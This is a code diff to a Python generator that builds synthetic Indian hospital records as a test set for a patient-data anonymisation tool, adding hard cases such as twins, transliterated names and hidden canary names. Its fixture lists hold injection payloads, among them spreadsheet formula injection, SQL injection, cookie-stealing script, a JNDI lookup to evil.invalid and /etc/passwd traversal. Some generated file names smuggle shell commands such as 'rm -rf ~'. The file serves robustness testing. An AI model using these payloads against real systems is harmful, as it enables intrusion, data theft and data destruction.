@@ -128,6 +128,21 @@ HOSPITALS = {
     "krm": ("Konkan Rural Mission Hospital", "कोंकण ग्रामीण मिशन अस्पताल"),
     "vzc": ("Vindhya Zila Chikitsalaya", "विंध्य ज़िला चिकित्सालय"),
 }
+
+# ---- level-2 ("hard") trap material -------------------------------------------------------------------------
+HOSPITALS_HARD = {"kvh": ("Kaveri Valley Hospital", "कावेरी वैली अस्पताल")}
+ALL_HOSPITALS = {**HOSPITALS, **HOSPITALS_HARD}
+TRANS_SUR = [("Iyer", "अय्यर"), ("Nair", "नायर"), ("Chaudhary", "चौधरी"), ("Thakur", "ठाकुर"), ("Menon", "मेनन"),
+             ("Pillai", "पिल्लई")]                       # romanise badly: Nair vs नायर (nayar), Iyer vs अय्यर (ayyar)
+APOS_SUR = [("D'Souza", "डिसूज़ा"), ("D'Cruz", "डिक्रूज़"), ("D'Mello", "डिमेलो")]
+FORMULAS = ["=CMD|' /C calc'!A0", "+SUM(1+1)*cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0",
+            '@HYPERLINK("http://evil.invalid/x","open")', "\t=1+1"]
+INJECTIONS = ["'; DROP TABLE patients;--", "<script>alert(document.cookie)</script>", "${jndi:ldap://evil.invalid/a}",
+              "{{7*7}}", "../../../../etc/passwd"]
+EPONYMS_HARD = ["Guillain-Barré syndrome", "Bell's palsy", "Hodgkin's lymphoma", "Cushing's syndrome", "Addison's disease",
+                "Parkinson's disease"]
+BAD_AGES = ["-1", "0x7fffffff", "9223372036854775807", "NaN"]
+CANARIES_HARD = ["Ezhilarasi Thiruvengadam", "Lalremruati Hmar", "Gurpreetinder Sohal"]
 DX_COMMON = [("I10", "Essential (primary) hypertension"), ("E11.9", "Type 2 diabetes mellitus without complications"),
              ("A90", "Dengue fever"), ("A01.0", "Typhoid fever"), ("J18.9", "Pneumonia, unspecified organism"),
              ("N39.0", "Urinary tract infection, site not specified"), ("A15.0", "Tuberculosis of lung"),
@@ -1341,8 +1356,277 @@ class Gauntlet:
         p = P[31].p
         zb = io.BytesIO()
         with zipfile.ZipFile(zb, "w") as z:
-            z.writestr("xl/sharedStrings.xml", f"<sst><si><t>{p.given} {p.sur}</t></si><si><t>{p.phone}</t></si></sst>")
+            z.writestr(zipfile.ZipInfo("xl/sharedStrings.xml", date_time=(2025, 1, 1, 0, 0, 0)), f"<sst><si><t>{p.given} {p.sur}</t></si><si><t>{p.phone}</t></si></sst>")
         bad("misc/ward_list.xlsx", "binary", zb.getvalue(), P[31], [("NAME", f"{p.given} {p.sur}"), ("PHONE", p.phone)])
+
+    # ---------------------------------------------------------------- level 2: hard traps
+    def gen_hard(self) -> None:
+        """Level-2 traps (own RNG, so level-1 content stays byte-identical): hostile exports and hostile people."""
+        main_r = self.r
+        self.r = random.Random(f"hard:{self.seed}:{self.pool}")
+        try:
+            self._gen_hard()
+        finally:
+            self.r = main_r
+
+    def _kvh_id(self) -> str:
+        return self._uniq(lambda: f"kvh/op/25-{self.r.randint(1000, 999999):06d}")   # lower-case hospital IDs
+
+    def _hard_patient(self, p: Person, trap: str) -> Patient:
+        idx = len(self.patients)
+        p.pid = f"P{idx:05d}"
+        pt = Patient(key=f"PT{idx:05d}", p=p, hosps=["kvh"], uhids={"kvh": [self._kvh_id()]}, traps=[trap])
+        pt.visits.append((REF_DATE - dt.timedelta(days=self.r.randint(20, 300)), "kvh", self.r.choice(COMPLAINTS), self.r.choice(DX_COMMON)))
+        self.patients.append(pt)
+        return pt
+
+    def _hard_canary(self, c: Ctx, full: str, channel: str = "content") -> tuple[str, str]:
+        pid = f"CANARY-H{len(self.canary_ids)}"
+        self.canary_ids.append(pid)
+        g, s = full.split(" ", 1)
+        c._ent("CANARY", full, pid, "patient", "latin", channel, "name", True, tokens=[g.lower(), s.lower()], full=True, canary=True)
+        ph = self.rdig(10, "6789")
+        c._ent("PHONE", ph, pid, "patient", "latin", channel, "digits", True, key=ph, canary=True)
+        return full, ph
+
+    def _gen_hard(self) -> None:
+        r = self.r
+        surn = [s for s in self.surnames]
+
+        def person(g: str, sur: tuple[str, str] | None = None, age=(22, 70)) -> Person:
+            p = self.new_person(g, sur=sur, age_range=age)
+            self.attach_relative(p)
+            return p
+
+        def copy_home(dst: Person, src: Person) -> None:
+            for attr in ("house", "locality", "landmark", "village", "tehsil", "district", "pin"):
+                setattr(dst, attr, getattr(src, attr))
+
+        # --- people ---
+        tr_sur = r.sample(TRANS_SUR, 2)
+        trans = [self._hard_patient(person("M", tr_sur[0]), "translit"), self._hard_patient(person("F", tr_sur[1]), "translit")]
+        t1p = person(r.choice("MF"))
+        t2p = self.new_person(t1p.gender, sur=(t1p.sur, t1p.sur_d))
+        while t2p.given == t1p.given:
+            t2p.given, t2p.given_d = r.choice(self.male if t1p.gender == "M" else self.female)
+        t2p.dob, t2p.rel_type, t2p.rel, t2p.phone = t1p.dob, t1p.rel_type, t1p.rel, t1p.phone
+        copy_home(t2p, t1p)
+        twins = [self._hard_patient(t1p, "twin"), self._hard_patient(t2p, "twin")]
+        fa = person("M", age=(55, 62))
+        so = self.new_person("M", sur=(fa.sur, fa.sur_d), age_range=(28, 33))
+        so.given, so.given_d, so.rel_type, so.rel, so.phone = fa.given, fa.given_d, "S/o", fa, fa.phone
+        copy_home(so, fa)
+        fs = [self._hard_patient(fa, "father_son"), self._hard_patient(so, "father_son")]
+        mp = person("F", age=(26, 40))
+        self.attach_relative(mp, "W/o")
+        maiden = r.choice([s for s in surn if s[0] != mp.sur])
+        mpt = self._hard_patient(mp, "maiden_name")
+        mother = self.new_person("F", age_range=(21, 32))
+        mother.rel_type = "W/o"
+        baby = self.new_person(r.choice("MF"), sur=(mother.sur, mother.sur_d), age_range=(0, 0))
+        baby.rel_type, baby.rel = ("S/o" if baby.gender == "M" else "D/o"), mother
+        copy_home(baby, mother)
+        newborn = self._hard_patient(baby, "newborn")
+        ap_sur = r.sample(APOS_SUR, 2)
+        apos = [self._hard_patient(person("F", ap_sur[0]), "apostrophe"), self._hard_patient(person("M", ap_sur[1]), "apostrophe")]
+        apos[0].p.dob = dt.date(1996, 2, 29)            # leap-day DOB
+        mixed = self._hard_patient(person("M"), "mixed_script")
+        dups = [self._hard_patient(person(r.choice("MF")), "corrupt_dup") for _ in range(4)]
+        self.hard_traps = {
+            "twins": [[twins[0].key, twins[1].key]], "father_son": [[fs[0].key, fs[1].key]],
+            "maiden_name": [mpt.key], "transliteration": [t.key for t in trans], "corrupt_duplicate": [d.key for d in dups],
+            "newborn": [newborn.key],
+        }
+        kvh = HOSPITALS_HARD["kvh"][0]
+
+        # --- 1. registration dump: duplicate headers, formula injection, NUL bytes, Excel-mangled phones, bad ages ---
+        fr = FileRec("registration/kaveri_valley_reg.csv", b"", "csv", "utf-8", ",", category="registration",
+                     generalizable=["col:Age"])
+        rows = [["Reg No", "Name", "Name", "Age", "Sex", "Mobile", "Remarks", "Referral"]]
+        order = trans + twins + fs + [mpt, newborn] + apos + [mixed] + dups
+
+        def reg_row(i: int, pt: Patient, bad_age: str | None) -> list[str]:
+            p = pt.p
+            c = self.unit(fr, f"row:{len(rows) - 1}", pt)
+            if "newborn" in pt.traps:
+                name = f"B/O {c.name(p.rel, 'full', role='relative')}"
+                kin = f"{p.rel_type} {c.name(p.rel, 'full', role='relative')}"
+                days = p.age * 365 + (REF_DATE - p.dob).days % 365
+                age = c.age(p, f"{days // 30} months" if days >= 30 else f"{days} days")
+            else:
+                name = c.name(p, surface=(p.given[:2] + "​" + p.given[2:] + " " + p.sur) if i % 5 == 3 else None)
+                if i % 3 == 0:
+                    kin = f"{p.rel_type} {c.name(p.rel, 'full', role='relative')} (PAN: {c.text('PAN', p.rel.pan, p.rel, critical=True, role='relative')})"
+                elif i % 3 == 1:
+                    kin = f"{p.rel_type} Late {c.name(p.rel, 'full', role='relative')}"
+                else:
+                    kin = f"C/O {c.name(p.rel, 'full', role='relative')}"
+                age = bad_age if bad_age is not None else c.age(p, str(p.age), "col:Age")
+            if "father_son" in pt.traps or "twin" in pt.traps:
+                mob = c.phone(p, i)                                    # one family phone
+            elif i % 4 == 1:
+                mob = c.text("PHONE", f"{p.phone[0]}.{p.phone[1:6]}E+09", p)  # Excel-mangled (lossy) phone
+            elif i % 4 == 2:
+                mob = c.digits("PHONE", f"{p.phone[:4]}​{p.phone[4:7]}​{p.phone[7:]}", p, key_digits=p.phone)
+            else:
+                mob = c.phone(p, i)
+            lead = FORMULAS[i % len(FORMULAS)] if i % 3 != 2 else INJECTIONS[i % len(INJECTIONS)]
+            remarks = (f"{lead} | {c.keep('C/O fever and weakness', 'complaint', trap='c/o-complaint')}; "
+                       f"{c.keep(EPONYMS_HARD[i % len(EPONYMS_HARD)], 'eponym', trap='eponym')}; "
+                       f"{c.keep(f'HbA1c {r.randint(55, 112) / 10}%', 'lab')}")
+            if i % 4 == 0 and "newborn" not in pt.traps:
+                ref = f"Ref: {c.name(p.rel, 'given', role='relative')}\x00{c.phone(p.rel, 0, role='relative')}"
+            else:
+                ref = "Self"
+            return [c.digits("MRN", pt.uhids["kvh"][0], p), name, kin, age, p.gender, mob, remarks, ref]
+        for i, pt in enumerate(order):
+            rows.append(reg_row(i, pt, None))
+            if "corrupt_dup" in pt.traps:                           # corrupted duplicate: same person, broken age
+                rows.append(reg_row(i, pt, BAD_AGES[dups.index(pt) % len(BAD_AGES)]))
+        fr.data = self._csv(rows, ",").encode("utf-8")
+        self.add(fr)
+
+        # --- 2. FHIR bundles: Devanagari-only names (transliteration), twins, father/son, village+PIN narrative ---
+        for n, pt in enumerate(trans + twins + fs + [apos[0], mixed, mpt]):
+            p = pt.p
+            fr = FileRec(f"fhir/kvh_{hashlib.sha1(f'{self.seed}{pt.key}hard'.encode()).hexdigest()[:8]}.json", b"", "fhir",
+                         category="fhir", generalizable=["/entry/[]/resource/birthDate", "/entry/[]/resource/address/[]/postalCode"])
+            c = self.unit(fr, "doc", pt)
+            dv = "translit" in pt.traps
+            nm = c.name(p, "full", "deva" if dv else "latin")
+            rel = c.name(p.rel, "full", "deva" if dv else "latin", role="relative")
+            vil = c.text("VILLAGE", p.village[1] if dv else p.village[0], p)
+            div = f"<div xmlns=\"http://www.w3.org/1999/xhtml\">{nm} ({p.rel_type} {rel}), {vil} {c.pin(p)}</div>"  # PIN with no cue
+            ident = [{"system": "urn:hospital:kvh", "value": c.digits("MRN", pt.uhids["kvh"][0], p)}]
+            if "maiden_name" in pt.traps:
+                ident.append({"system": "https://uidai.gov.in", "value": c.digits("AADHAAR", fmt_aadhaar(p.aadhaar, 1), p)})
+            dx = r.choice(DX_COMMON)
+            doc = r.choice(DOCTORS)
+            res = [
+                {"resourceType": "Patient", "id": f"pat-{n}", "text": {"status": "generated", "div": div},
+                 "identifier": ident, "name": [{"text": nm}],
+                 "telecom": [{"system": "phone", "value": c.phone(p, 2 + n)}],
+                 "gender": "male" if p.gender == "M" else "female",
+                 "birthDate": c.dob(p, "iso", "/entry/0/resource/birthDate"),
+                 "address": [{"city": vil, "district": c.keep(p.district[0], "district", 0.3), "postalCode": c.pin(p)}]},
+                {"resourceType": "Practitioner", "id": f"prac-{n}", "name": [{"text": c.keep("Dr. " + doc[0], "doctor", 0.5, trap="doctor")}]},
+                {"resourceType": "Condition", "id": f"cond-{n}", "subject": {"reference": f"Patient/pat-{n}"},
+                 "code": {"coding": [{"system": "http://hl7.org/fhir/sid/icd-10", "code": c.keep(dx[0], "diagnosis_code"),
+                                      "display": c.keep(dx[1], "diagnosis")}]}},
+            ]
+            bundle = {"resourceType": "Bundle", "id": f"kvh-{n}", "type": "collection",
+                      "entry": [{"fullUrl": f"urn:kvh:{x['id']}", "resource": x} for x in res]}
+            fr.data = json.dumps(bundle, ensure_ascii=False, indent=2).encode("utf-8")
+            self.add(fr)
+
+        # --- 3. legacy JSON: maiden name + Aadhaar + phone, float phone, injection strings ---
+        fr = FileRec("registration/kvh_legacy_2019.json", b"", "json", category="registration")
+        legacy = []
+        for j, pt in enumerate([mpt, apos[1], dups[0]]):
+            p = pt.p
+            c = self.unit(fr, f"/rows/{j}", pt)
+            row: dict[str, Any] = {"reg_year": 2019, "remarks": INJECTIONS[j]}
+            if pt is mpt:
+                row["name"] = c.name(p, surface=f"{p.given} {maiden[0]}")       # name before marriage
+                row["aadhaar"] = c.digits("AADHAAR", fmt_aadhaar(p.aadhaar, 0), p)
+                row["mobile"] = c.phone(p, 0)
+            else:
+                row["name"] = c.name(p, "full")
+                row["mobile"] = float(c.digits("PHONE", p.phone, p))           # Excel float: 9876543210.0
+                row["reg_no"] = c.digits("MRN", pt.uhids["kvh"][0], p)
+            legacy.append(row)
+        fr.data = json.dumps({"source": "KVH HIS 2019 export", "rows": legacy}, ensure_ascii=False, indent=2).encode("utf-8")
+        self.add(fr)
+
+        # --- 4. progress notes: bidi-reversed phone, mixed script, doctor sharing the surname, leap day, B/O ---
+        def note(path: str, pt: Patient, body) -> None:
+            fr = FileRec(path, b"", "text", category="notes")
+            c = self.unit(fr, "doc", pt)
+            fr.data = body(c, pt.p).encode("utf-8")
+            self.add(fr)
+        p = trans[1].p
+        note("notes/kvh_progress_a.txt", trans[1], lambda c, p: (
+            f"KAVERI VALLEY HOSPITAL - PROGRESS NOTE\nPatient: {c.name(p, 'full', 'deva')} | Reg. No.: {c.digits('MRN', trans[1].uhids['kvh'][0], p)}\n"
+            f"Alt. contact: {c.digits('PHONE', chr(0x202E) + p.phone[::-1] + chr(0x202C), p, key_digits=p.phone[::-1])}\n"
+            f"Rx: {c.keep('Tab. Telmisartan 40 mg OD', 'medication', trap='dose')}. {c.keep('Hb 11.4 g/dL', 'lab')}.\n"))
+        note("notes/kvh_progress_b.txt", mixed, lambda c, p: (
+            f"Pt {c.name(p, surface=p.given_d + ' ' + p.sur, script='deva')} ({p.age}{p.gender}) seen by "
+            f"{c.keep('Dr. Kavita ' + p.sur, 'doctor', 0.5, trap='doctor')} today.\n"
+            f"{c.keep('K/C/O HTN', 'history', trap='k/c/o')}, {c.keep('Amlodipine 5 mg 1-0-0', 'medication', trap='dose')}.\n"))
+        note("notes/kvh_progress_c.txt", apos[0], lambda c, p: (
+            f"Name: {c.name(p, 'full')}   DOB: {c.dob(p, 'dmy_slash')}\nFollow-up was booked for 31/02/2025 (invalid date in source).\n"
+            f"Dx: {c.keep(EPONYMS_HARD[0], 'eponym', trap='eponym')}; {c.keep('Platelets 245000 /uL', 'lab')}\n"))
+        note("notes/kvh_nicu_note.txt", newborn, lambda c, p: (
+            f"NICU NOTE\nB/O {c.name(p.rel, 'full', role='relative')}, Reg. No.: {c.digits('MRN', newborn.uhids['kvh'][0], p)}\n"
+            f"{c.keep('Neonatal jaundice', 'diagnosis')}, {c.keep('phototherapy 24 h', 'procedure')}; {c.keep('Apgar score 9/10', 'lab')}\n"))
+        # father/son: a line that names "the" Ramesh Sharma with only the family phone -> ambiguous on purpose
+        note("notes/kvh_whatsapp_family.txt", fs[0], lambda c, p: (
+            f"[12/09/25, 9:14 am] Ward Clerk: {c.name(p, 'plain')} ka BP check karna hai, call {c.phone(p, 3)}\n"
+            f"[12/09/25, 9:20 am] Sister: {c.keep('BP 150/96', 'vital', 0.5)} noted\n"))
+
+        # --- 5. big-field JSON (150 KB field with a canary), float phone, injections ---
+        fr = FileRec("opd/kvh_visits_bigfield.json", b"", "json", category="opd")
+        visits = []
+        for j, pt in enumerate(dups[1:]):
+            p = pt.p
+            c = self.unit(fr, f"/visits/{j}", pt)
+            v: dict[str, Any] = {"name": c.name(p, "full"), "reg_no": c.digits("MRN", pt.uhids["kvh"][0], p),
+                                 "complaint": c.keep("C/O pain abdomen x 2 days", "complaint", trap="c/o-complaint"),
+                                 "remarks": INJECTIONS[(j + 2) % len(INJECTIONS)]}
+            if j == 0:
+                cn, cph = self._hard_canary(c, CANARIES_HARD[0])
+                v["scan_text"] = ("CLINICAL_LOG_PAD " * 4500) + f" pass issued to {cn}, ph {cph} " + ("END_PAD " * 9000)
+            else:
+                v["mobile"] = c.phone(p, j)
+            visits.append(v)
+        fr.data = json.dumps({"facility": kvh, "visits": visits}, ensure_ascii=False, indent=1).encode("utf-8")
+        self.add(fr)
+
+        # --- 6. hostile files: unsafe names, NaN JSON, buffer and regex bombs, more binaries ---
+        def bad(path: str, fmt: str, data: bytes, ents: list[tuple[str, str, Person]], fname_ent: tuple[str, Person] | None = None) -> None:
+            fr = FileRec(path, data, fmt, expect="either", category="malformed")
+            c = self.unit(fr, "@file", None)
+            for typ, surf, who in ents:
+                if typ == "NAME":
+                    c.name(who, surface=surf)
+                else:
+                    c.digits(typ, surf, who)
+            if fname_ent:
+                fc = self.unit(fr, "@filename", None)
+                fc.name(fname_ent[1], surface=fname_ent[0], channel="filename")
+            self.add(fr)
+        q1, q2, q3 = dups[1].p, dups[2].p, dups[3].p
+        bad("misc/$(whoami)_kvh_opd.json", "json",
+            json.dumps({"visits": [{"name": f"{q1.given} {q1.sur}", "mobile": q1.phone}]}).encode(),
+            [("NAME", f"{q1.given} {q1.sur}", q1), ("PHONE", q1.phone, q1)])
+        bad("misc/visit;rm -rf ~;.txt", "text", f"Patient {q2.given} {q2.sur}, mobile {q2.phone}\n".encode(),
+            [("NAME", f"{q2.given} {q2.sur}", q2), ("PHONE", q2.phone, q2)])
+        bad(f"misc/.._.._etc_passwd_{q3.given}.txt", "text", f"Patient: {q3.given} {q3.sur}\n".encode(),
+            [("NAME", f"{q3.given} {q3.sur}", q3)], fname_ent=(q3.given, q3))
+        bad("misc/`id`_lab.csv", "csv", f"name,mobile\n{q1.given} {q1.sur},{q1.phone}\n".encode(),
+            [("NAME", f"{q1.given} {q1.sur}", q1), ("PHONE", q1.phone, q1)])
+        bad("misc/vitals_nan.json", "json",
+            ('{"visits": [{"name": "%s %s", "age": NaN, "los": Infinity, "mobile": "%s"}]}' % (q2.given, q2.sur, q2.phone)).encode(),
+            [("NAME", f"{q2.given} {q2.sur}", q2), ("PHONE", q2.phone, q2)])
+        fr = FileRec("notes/ocr_single_line.txt", b"", "text", expect="either", category="malformed")
+        c = self.unit(fr, "@file", None)
+        cn, cph = self._hard_canary(c, CANARIES_HARD[1])
+        fr.data = ("A" * 600_000 + f" pass issued to {cn} {cph} " + "B" * 600_000).encode()
+        self.add(fr)
+        fr = FileRec("notes/regex_bomb.txt", b"", "text", expect="either", category="malformed")
+        c = self.unit(fr, "@file", None)
+        cn, cph = self._hard_canary(c, CANARIES_HARD[2])
+        fr.data = ("Phone: " + "9" * 50_000 + " " + "a " * 15_000 + f" call {cn} on {cph}").encode()
+        self.add(fr)
+        zb = io.BytesIO()
+        with zipfile.ZipFile(zb, "w") as z:
+            z.writestr(zipfile.ZipInfo("word/document.xml", date_time=(2025, 1, 1, 0, 0, 0)), f"<w:document><w:t>{q3.given} {q3.sur} {q3.phone}</w:t></w:document>")
+        bad("misc/discharge_letter.docx", "binary", zb.getvalue(), [("NAME", f"{q3.given} {q3.sur}", q3), ("PHONE", q3.phone, q3)])
+        bad("misc/ward_backup.db", "binary", b"SQLite format 3\x00" + f"{q2.given} {q2.sur} {q2.phone}".encode() + bytes(64),
+            [("NAME", f"{q2.given} {q2.sur}", q2), ("PHONE", q2.phone, q2)])
+        bad("misc/null_padding.txt", "text", b"\x00" * 4096, [])
+        bad("misc/broken_utf16.txt", "text", b"\xff\xfe" + f"Patient {q1.given} {q1.sur}".encode("utf-16-le") + b"\x00\xd8",
+            [("NAME", f"{q1.given} {q1.sur}", q1)])
 
     # ---------------------------------------------------------------- truth + attacker
     def finalize(self, out: Path) -> None:
@@ -1427,9 +1711,10 @@ class Gauntlet:
             "family_phone": [self.patients[10].key, self.patients[11].key],
             "reregistration": [self.patients[12].key],
         }
+        traps.update(getattr(self, "hard_traps", {}))
         truth = {
             "schema": "raksha-truth/1", "generator_version": "gauntlet-1.0", "seed": f"gauntlet-{self.seed}-{self.pool}",
-            "profile": "gauntlet", "chaos": True, "ref_date": REF_DATE.isoformat(), "files": files_json,
+            "profile": "gauntlet" if not getattr(self, "hard_traps", None) else "gauntlet-hard", "chaos": True, "ref_date": REF_DATE.isoformat(), "files": files_json,
             "patients": {pt.key: {"rid": pt.p.rid, "pid": pt.p.pid, "hospitals": pt.hosps, "uhids": pt.uhids, "traps": pt.traps}
                          for pt in self.patients},
             "traps": traps, "linkability": {"required_units": n_req, "ambiguous_units": n_amb},
@@ -1449,7 +1734,7 @@ class Gauntlet:
         facts = []
         for pt in self.patients:
             if any(t.startswith("reid") for t in pt.traps) or self.r.random() < 0.3:
-                f = {"rid": pt.p.rid, "visit_dates": [pt.visits[0][0].isoformat()], "hospital": HOSPITALS[pt.visits[0][1]][0]}
+                f = {"rid": pt.p.rid, "visit_dates": [pt.visits[0][0].isoformat()], "hospital": ALL_HOSPITALS[pt.visits[0][1]][0]}
                 if pt.adm and any(t.startswith("reid") for t in pt.traps):
                     f["condition_hint"] = pt.adm.dx[1]
                     f["visit_dates"] = [pt.adm.adm.isoformat()]
@@ -1500,6 +1785,8 @@ def main() -> int:
     ap.add_argument("--pool", choices=["A", "B"], default="A")
     ap.add_argument("--patients", type=int, default=44)
     ap.add_argument("--bulk", type=int, default=3000)
+    ap.add_argument("--level", type=int, choices=[1, 2], default=2,
+                    help="1 = original trap set (reproduces sets/A7, sets/B11); 2 = plus the hard traps")
     a = ap.parse_args()
     if a.patients < 32:
         ap.error("--patients must be >= 32 (trap slots)")
@@ -1513,6 +1800,8 @@ def main() -> int:
     g.gen_clean()
     g.gen_hidden()
     g.gen_malformed()
+    if a.level >= 2:
+        g.gen_hard()
     g.finalize(Path(a.out))
     return 0
 
